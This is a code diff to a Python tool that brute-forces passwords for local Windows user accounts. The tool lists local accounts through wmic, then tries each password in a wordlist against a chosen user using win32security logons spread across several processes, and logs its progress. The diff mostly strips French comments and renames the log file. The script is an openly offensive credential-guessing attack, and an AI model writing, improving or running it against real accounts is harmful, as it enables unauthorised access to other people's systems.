@@ -3,24 +3,18 @@ import win32security
 import time
 from multiprocessing import Pool, Manager, Lock
 
-LOG_FILE = "log.txt"
+LOG_FILE = "bruteforcelog.txt"
 
 def write_log(message):
-    """
-    Écrit un message dans le fichier log.
-    """
     with open(LOG_FILE, "a") as log_file:
         log_file.write(message + "\n")
 
 def list_users():
-    """
-    Liste les comptes utilisateurs locaux.
-    """
     try:
         print("\n[INFO] Listing local user accounts...\n")
         raw_output = os.popen("wmic useraccount where \"localaccount='true'\" get name").read()
-        users = [line.strip() for line in raw_output.splitlines() if line.strip()]  # Nettoyer les lignes
-        for user in users[1:]:  # Ignorer l'en-tête "Name"
+        users = [line.strip() for line in raw_output.splitlines() if line.strip()]
+        for user in users[1:]:
             print(user)
     except Exception as e:
         print(f"Error listing users: {e}")
@@ -28,9 +22,6 @@ def list_users():
     input("\nPress any key to return to the main menu...")
 
 def change_log_file():
-    """
-    Change le fichier de log.
-    """
     global LOG_FILE
     new_log_file = input("\n[INFO] Enter the new log file name (e.g., new_log.txt):\n>> ")
     LOG_FILE = new_log_file
@@ -38,22 +29,16 @@ def change_log_file():
     input("\nPress any key to return to the main menu...")
 
 def clear_log_file():
-    """
-    Vide le contenu du fichier de log.
-    """
     global LOG_FILE
     if os.path.exists(LOG_FILE):
         with open(LOG_FILE, "w") as log_file:
-            log_file.write("")  # Effacer le contenu
+            log_file.write("")
         print(f"[INFO] Log file '{LOG_FILE}' has been cleared.")
     else:
         print(f"[INFO] Log file '{LOG_FILE}' does not exist.")
     input("\nPress any key to return to the main menu...")
 
 def bruteforce():
-    """
-    Lance une attaque par force brute sur un compte utilisateur.
-    """
     user = input("\n[TARGET USER]\n>> ")
     wordlist = input("\n[PASSWORD LIST]\n>> ")
 
@@ -80,7 +65,7 @@ def bruteforce():
     found_event = manager.Value('b', False)
     result_queue = manager.Queue()
 
-    processes = min(4, os.cpu_count())  # Utilisation dynamique du nombre de cœurs CPU
+    processes = min(4, os.cpu_count())
     print(f"[INFO] Using {processes} processes for testing...")
     write_log(f"[INFO] Using {processes} processes for testing...")
 
@@ -108,17 +93,13 @@ def bruteforce():
     input("\nPress any key to return to the main menu...")
 
 def try_password(user, password, attempt_num, total_attempts, found_event, result_queue):
-    """
-    Tente de valider un mot de passe pour un utilisateur donné.
-    """
     if found_event.value:
         return False
 
-    # Créer un Lock à l'intérieur du processus
     lock = Lock()
 
     try:
-        if attempt_num % 1000 == 0:  # Mise à jour toutes les 1000 tentatives
+        if attempt_num % 1000 == 0:
             message = f"[INFO] Tested {attempt_num}/{total_attempts} passwords."
             result_queue.put(message)
             with lock:
@@ -138,7 +119,6 @@ def try_password(user, password, attempt_num, total_attempts, found_event, resul
             found_event.value = True
             return True
         except win32security.error as e:
-            # Log the specific error
             error_message = f"[ERROR] Failed to log in with password '{password}'. Error: {str(e)}"
             result_queue.put(error_message)
             with lock:
@@ -154,11 +134,8 @@ def try_password(user, password, attempt_num, total_attempts, found_event, resul
     return False
 
 def main_menu():
-    """
-    Menu principal du programme.
-    """
     if os.path.exists(LOG_FILE):
-        os.remove(LOG_FILE)  # Supprime l'ancien fichier log au démarrage
+        os.remove(LOG_FILE)
 
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
